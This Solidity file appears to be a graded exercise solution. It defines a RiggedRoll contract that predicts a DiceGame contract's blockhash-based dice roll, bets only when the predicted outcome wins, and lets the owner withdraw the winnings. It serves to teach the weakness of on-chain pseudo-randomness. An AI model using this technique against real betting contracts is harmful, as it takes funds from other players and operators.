pragma solidity >=0.8.0 <0.9.0; //Do not change the solidity version as it negatively impacts submission grading
//SPDX-License-Identifier: MIT

import "hardhat/console.sol";
import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract RiggedRoll is Ownable {
    DiceGame public diceGame;

    constructor(address payable diceGameAddress) Ownable(msg.sender) {
        diceGame = DiceGame(diceGameAddress);
    }

    function withdraw(address _addr, uint256 _amount) external onlyOwner {
        require(address(this).balance >= _amount, "no eth to withdraw");
        (bool send, ) = _addr.call{ value: _amount }("");
        require(send, "call failed");
    }

    function riggedRoll() external {
        require(address(this).balance >= 0.002 ether);
        uint256 nonce = diceGame.nonce();
        bytes32 prevHash = blockhash(block.number - 1);
        bytes32 hash = keccak256(abi.encodePacked(prevHash, address(this), nonce));
        uint256 roll = uint256(hash) % 16;
        require(roll <= 5,'not good roll');
        diceGame.rollTheDice{ value: 0.002 ether }();
    }

    receive() external payable {}

}
